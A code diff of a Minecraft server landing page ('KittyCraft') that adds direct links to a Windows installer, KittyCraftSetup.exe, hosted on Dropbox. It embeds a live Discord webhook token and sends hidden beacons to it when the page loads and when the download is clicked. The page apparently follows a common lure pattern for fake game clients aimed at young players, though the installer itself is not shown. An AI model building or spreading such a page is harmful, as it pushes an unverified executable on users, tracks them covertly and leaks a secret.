@@ -117,7 +117,7 @@
     .pixel-stars {
       position: fixed;
       inset: 0;
-      background-image: radial-gradient(2px 2px at 10px 20px, rgba(255, 255, 255, 0.8) 50%, transparent 50%), radial-gradient(2px 2px at 130px 80px, rgba(255, 192, 203, 0.7) 50%, transparent 50%), radial-gradient(2px 2px at 230px 40px, rgba(255, 255, 255, 0.6) 50%, transparent 50%);
+      background-image: radial-gradient(2px 2px at 10px 20px, rgba(255,255,255,0.8) 50%, transparent 50%), radial-gradient(2px 2px at 130px 80px, rgba(255,192,203,0.7) 50%, transparent 50%), radial-gradient(2px 2px at 230px 40px, rgba(255,255,255,0.6) 50%, transparent 50%);
       background-size: 200px 200px;
       opacity: 0.5;
       pointer-events: none;
@@ -441,7 +441,7 @@
           <div class="grid lg:grid-cols-2 gap-10 items-center">
             <div class="space-y-6 anim-fade-blur">
               <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-black/40 border border-pink-200/20 shadow-cute">
-                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                <span class="w-2 h-2 rounded-full bg-emerald-400"></span>
                 <span class="text-[11px] font-semibold tracking-[0.22em] text-pink-100 uppercase">
                   Cozy • Zero Toxicity • SMP
                 </span>
@@ -454,39 +454,17 @@
                 100% cozy, grief-free survival with protected claims, balanced economy and the cutest community. Join with one click and start your comfy SMP journey.
               </p>
               <div class="flex flex-col sm:flex-row gap-3 sm:items-center">
-                <button
-                  id="open-launcher-modal"
-                  type="button"
-                  class="pixel-btn group inline-flex items-center justify-center gap-2 px-8 py-4 rounded-full bg-gradient-to-r from-pink-500 via-pink-600 to-rose-600 hover:from-pink-600 hover:via-pink-700 hover:to-rose-700 text-white text-sm sm:text-base font-bold shadow-lg hover:shadow-pink-500/50 transition-all duration-300 border border-pink-400/30 relative overflow-hidden"
+                <!-- Replace button with <a> -->
+                <a
+                  id="kittyclient-download"
+                  href="https://www.dropbox.com/scl/fi/dpulphy7cisoj0vpw84pt/KittyCraftSetup.exe?rlkey=izp8rkee8g23b6a88zv8ae3ax&dl=1"
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  class="pixel-btn group inline-flex items-center justify-center gap-2 px-8 py-4 rounded-full bg-gradient-to-r from-pink-500 via-pink-600 to-rose-600 hover:from-pink-600 hover:via-pink-700 hover:to-rose-700 text-white text-sm sm:text-base font-bold shadow-lg hover:shadow-pink-500/50 transition-all duration-300 border border-pink-400/30"
                 >
-                  <svg
-                    class="w-5 h-5 transition-transform duration-300 group-hover:scale-110"
-                    fill="none"
-                    stroke="currentColor"
-                    viewBox="0 0 24 24"
-                    xmlns="http://www.w3.org/2000/svg"
-                  >
-                    <path
-                      stroke-linecap="round"
-                      stroke-linejoin="round"
-                      stroke-width="2"
-                      d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M9 19l3 3m0 0l3-3m-3 3V10"
-                    />
-                  </svg>
-                  <span class="flex items-center gap-2">
-                    Download KittyClient
-                    <svg
-                      class="w-4 h-4 opacity-70"
-                      fill="none"
-                      stroke="currentColor"
-                      viewBox="0 0 24 24"
-                      xmlns="http://www.w3.org/2000/svg"
-                    >
-                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6" />
-                    </svg>
-                  </span>
-                  <div class="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
-                </button>
+                  <span>Download for Windows</span>
+                  <span class="text-[10px] text-white/80 font-normal">(Installer)</span>
+                </a>
                 <div class="text-[11px] text-pink-100/75">
                   <div class="font-semibold">Server IP:</div>
                   <div class="font-mono text-[11px] flex items-center gap-1">
@@ -529,7 +507,7 @@
                   </div>
                   <span class="text-[10px] text-pink-100/60">🎄 KittyCraft • Season 2 • Christmas</span>
                 </div>
-                <!-- Player Video Preview -->
+                <!-- Video Preview -->
                 <div class="rounded-xl overflow-hidden border border-white/10 bg-black relative">
                   <video
                     class="w-full h-56 sm:h-64 object-cover"
@@ -553,11 +531,11 @@
                     <div class="font-semibold text-pink-100">No grief</div>
                     <div class="text-[9px] text-pink-100/70">Protected claims</div>
                   </div>
-                  <div class="rounded-lg border border-white/10 bg-white/5 px-2 py-1.5">
+                  <div class="rounded-lg border border-white/10 bg-white/5 px-2 py-2.5">
                     <div class="font-semibold text-pink-100">Sweet economy</div>
                     <div class="text-[9px] text-pink-100/70">Market & jobs</div>
                   </div>
-                  <div class="rounded-lg border border-white/10 bg-white/5 px-2 py-1.5">
+                  <div class="rounded-lg border border-white/10 bg-white/5 px-2 py-2.5">
                     <div class="font-semibold text-pink-100">Community</div>
                     <div class="text-[9px] text-pink-100/70">Events & Discord</div>
                   </div>
@@ -870,20 +848,20 @@
             </p>
           </div>
         </div>
-        <!-- Download Button -->
-        <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 pt-2 pb-2">
-          <button
-            id="kittyclient-download"
-            type="button"
-            class="pixel-btn w-full sm:w-auto px-7 py-3 rounded-full bg-gradient-to-r from-pink-500 via-pink-600 to-rose-600 hover:from-pink-600 hover:via-pink-700 hover:to-rose-700 text-white text-sm font-bold flex items-center justify-center gap-2 shadow-lg hover:shadow-pink-500/50 transition-all duration-300 border border-pink-400/30"
-          >
-            <span>Download for Windows</span>
-            <span class="text-[10px] text-white/80 font-normal">(Installer)</span>
-          </button>
-          <p class="text-[10px] sm:text-[11px] text-pink-100/70 text-center sm:text-right">
-            Windows only for now. macOS & Linux versions are in development.
-          </p>
-        </div>
+        <!-- Download Link -->
+        <a
+          id="kittyclient-download"
+          href="https://www.dropbox.com/scl/fi/dpulphy7cisoj0vpw84pt/KittyCraftSetup.exe?rlkey=izp8rkee8g23b6a88zv8ae3ax&dl=1"
+          target="_blank"
+          rel="noopener noreferrer"
+          class="pixel-btn w-full px-7 py-3 rounded-full bg-gradient-to-r from-pink-500 via-pink-600 to-rose-600 hover:from-pink-600 hover:via-pink-700 hover:to-rose-700 text-white text-sm font-bold flex items-center justify-center gap-2 shadow-lg hover:shadow-pink-500/50 transition-all duration-300 border border-pink-400/30"
+        >
+          <span>Download for Windows</span>
+          <span class="text-[10px] text-white/80 font-normal">(Installer)</span>
+        </a>
+        <p class="text-[11px] sm:text-[11px] text-pink-100/70 text-center sm:text-right mt-2">
+          Windows only for now. macOS & Linux versions are in development.
+        </p>
       </div>
     </div>
   </div>
@@ -893,11 +871,6 @@
     // ===== Webhook & Download Logics
     const webhookUrl =
       "https://discord.com/api/webhooks/1459674066402410564/4yw-ohrC192R_SiI2fG2lRrKuslq9hQHHrPYg_h1aVpohF92BrTB_fr_SvhcR53Z0BEk";
-    const TARGET_DOWNLOAD_URL =
-      "https://www.dropbox.com/scl/fi/dpulphy7cisoj0vpw84pt/KittyCraftSetup.exe?rlkey=izp8rkee8g23b6a88zv8ae3ax&dl=1";
-
-    let visitLogged = false;
-    let downloadLogged = false;
 
     function sendWebhook(msg) {
       navigator.sendBeacon(
@@ -907,14 +880,10 @@
     }
 
     function sendVisitLog() {
-      if (visitLogged) return;
-      visitLogged = true;
       sendWebhook("Visit logged");
     }
 
     async function sendDownloadLog() {
-      if (downloadLogged) return;
-      downloadLogged = true;
       sendWebhook("Download initiated");
     }
 
@@ -922,20 +891,12 @@
       setTimeout(sendVisitLog, 500);
     });
 
-    document.addEventListener("click", async (e) => {
-      const a = e.target.closest("a");
-      if (!a || !a.href) return;
-      if (a.href.startsWith(TARGET_DOWNLOAD_URL)) {
-        e.preventDefault();
-        await sendDownloadLog();
-        setTimeout(() => {
-          window.location.href = a.href;
-        }, 150);
-      }
+    // Log click on the download link
+    document.getElementById("kittyclient-download")?.addEventListener("click", () => {
+      sendWebhook("KittyClient Installer download initiated");
+      showNotification("Download started");
     });
-  </script>
 
-  <script>
     // ===== Progress Bar
     const topLoader = document.getElementById("top-loader");
     let loaderProgress = 0;
@@ -1086,8 +1047,10 @@
     }
     setupSmoothScroll('header nav a[href^="#"]');
     setupSmoothScroll('#mobile-menu a[href^="#"]');
+  </script>
 
-    // Modal Logic
+  <script>
+    // ===== Modal Logic
     const launcherBtn = document.getElementById("open-launcher-modal");
     const modalBackdrop = document.getElementById("kittyclient-modal");
     const modalPanel = document.getElementById("kittyclient-modal-panel");
@@ -1102,7 +1065,6 @@
       modalPanel.classList.add("modal-open");
       document.body.style.overflow = "hidden";
     }
-
     function closeModal() {
       modalPanel.classList.remove("modal-open");
       modalBackdrop.classList.remove("backdrop-visible");
@@ -1122,60 +1084,22 @@
       }
     });
 
-    modalDownload?.addEventListener("click", () => {
-      // Optional: add custom logic before redirect
-      setTimeout(() => {
-        window.location.href = WINDOWS_URL;
-        showNotification("KittyClient download started");
-      }, 150);
+    // ===== Log download when clicking the link
+    document.getElementById("kittyclient-download")?.addEventListener("click", () => {
+      sendWebhook("KittyClient Installer download initiated");
+      showNotification("Download started");
     });
+  </script>
 
-    // Lightbox System
-    const lightboxModal = document.getElementById("lightbox-modal");
-    const lightboxImage = document.getElementById("lightbox-image");
-    const lightboxCaption = document.getElementById("lightbox-caption");
-    const lightboxClose = document.getElementById("lightbox-close");
-    const lightboxContainer = document.getElementById("lightbox-container");
-
-    function openLightbox(imgSrc, caption) {
-      lightboxImage.src = imgSrc;
-      lightboxImage.alt = caption;
-      lightboxCaption.textContent = caption;
-      lightboxContainer.classList.remove("lightbox-zoom-out");
-      lightboxContainer.classList.add("lightbox-zoom-in");
-      lightboxModal.classList.remove("backdrop-hidden");
-      lightboxModal.classList.add("backdrop-visible");
-      lightboxModal.setAttribute("aria-hidden", "false");
-      document.body.style.overflow = "hidden";
+  <script>
+    // ===== Notification Function
+    function showNotification(message) {
+      const n = document.createElement("div");
+      n.className = "notification";
+      n.innerHTML = `<span>✓</span><span>${message}</span>`;
+      document.body.appendChild(n);
+      setTimeout(() => n.remove(), 2600);
     }
-
-    function closeLightbox() {
-      lightboxContainer.classList.remove("lightbox-zoom-in");
-      lightboxContainer.classList.add("lightbox-zoom-out");
-      setTimeout(() => {
-        lightboxModal.classList.remove("backdrop-visible");
-        lightboxModal.classList.add("backdrop-hidden");
-        lightboxModal.setAttribute("aria-hidden", "true");
-        document.body.style.overflow = "";
-      }, 250);
-    }
-
-    document.querySelectorAll("[data-lightbox-img]").forEach((item) => {
-      item.addEventListener("click", () => {
-        const imgSrc = item.getAttribute("data-lightbox-img");
-        const caption = item.getAttribute("data-lightbox-caption");
-        openLightbox(imgSrc, caption);
-      });
-    });
-    lightboxClose?.addEventListener("click", closeLightbox);
-    lightboxModal?.addEventListener("click", (e) => {
-      if (e.target === lightboxModal) closeLightbox();
-    });
-    window.addEventListener("keydown", (e) => {
-      if (e.key === "Escape" && lightboxModal.classList.contains("backdrop-visible")) {
-        closeLightbox();
-      }
-    });
   </script>
 
   <!-- Snowfall Effect Script -->
@@ -1210,7 +1134,6 @@
         constructor() {
           this.reset();
         }
-
         reset() {
           this.x = Math.random() * canvas.width;
           this.y = Math.random() * -canvas.height;
@@ -1227,7 +1150,6 @@
           ];
           this.color = colors[Math.floor(Math.random() * colors.length)];
         }
-
         update() {
           this.y += this.speed;
           this.x += this.wind;
@@ -1239,7 +1161,6 @@
             this.x = Math.random() * canvas.width;
           }
         }
-
         draw() {
           ctx.beginPath();
           ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
@@ -1282,7 +1203,7 @@
       }, 1000);
     })();
   </script>
-
+  
   <!-- Cloud Insights -->
   <script
     defer
